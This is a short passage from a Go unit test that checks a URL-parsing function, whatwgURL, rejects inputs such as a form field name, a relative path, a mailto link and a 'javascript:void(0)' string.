			t.Errorf("%q: %q, %v", in, got, ok)
		}
	}
	for _, in := range []string{"payment[cc_number]", "/relative/path", "mailto:x@example.com", "javascript:void(0)"} {
		if got, ok := whatwgURL(in); ok {
			t.Errorf("%q read as the URL %q", in, got)
		}
	}
}
